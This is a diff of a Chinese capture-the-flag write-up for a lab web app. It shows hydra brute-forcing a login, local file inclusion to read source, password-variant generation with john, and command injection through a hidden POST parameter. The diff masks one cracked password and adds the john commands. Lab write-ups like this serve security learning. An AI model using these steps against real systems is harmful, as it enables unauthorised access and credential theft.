@@ -34,7 +34,7 @@ hydra -l 'help@support.thm' \
   10.48.186.* \
   http-post-form '/:email=^USER^&password=^PASS^:Invalid credentials'
 ```
-**结果**：爆破出密码为 `helpme`（或者其他字典命中密码）。登录成功后进入 `dashboard.php`。
+**结果**：爆破出密码为 `****`（或者其他字典命中密码）。登录成功后进入 `dashboard.php`。
 
 ### 2. LFI 读取源码，获取主密码
 登录后发现 URL 存在 `?skin=red` 等参数，猜测存在本地文件包含漏洞。
@@ -79,8 +79,13 @@ http://10.48.186.*/user/1
 成功获取最高管理员的邮箱：`specialadmin@support.thm`。
 
 ### 5. 变形爆破，获取管理员真实密码
+# 将主密码写入基础文件
+echo "support@110" > base.txt
+
+# 使用 John 的默认规则生成变体字典
+john --wordlist=base.txt --rules --stdout > variants.txt
 尝试直接用主密码 `support@110` 登录管理员账号失败。推测密码进行过简单变形，去掉 `@` 符号。
-尝试密码：`support110`。使用该密码成功登录管理员账号。
+尝试密码破解：`support110`。使用该密码成功登录管理员账号。
 
 ### 6. 命令注入 (Command Injection) 获取 Flag
 登录后，发现页面上并没有直接显示“系统诊断”的输入框。但通过之前的方法，可以读取到 `footer.php` 的源码，发现了其中的隐藏逻辑：
@@ -99,7 +104,7 @@ if ($isAdmin && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sys'])) {
 }
 ```
 **利用原理**：代码限制参数必须以 `date` 开头，且只接受 `POST` 请求。由于页面不显示输入框，我们需要手动构造 POST 请求。
-
+也可以直接改页面上的命令
 *先获取真实管理员的 `PHPSESSID`（在 F12 的 Application 中查看）。*
 
 **使用 curl 发送 POST 命令注入**：
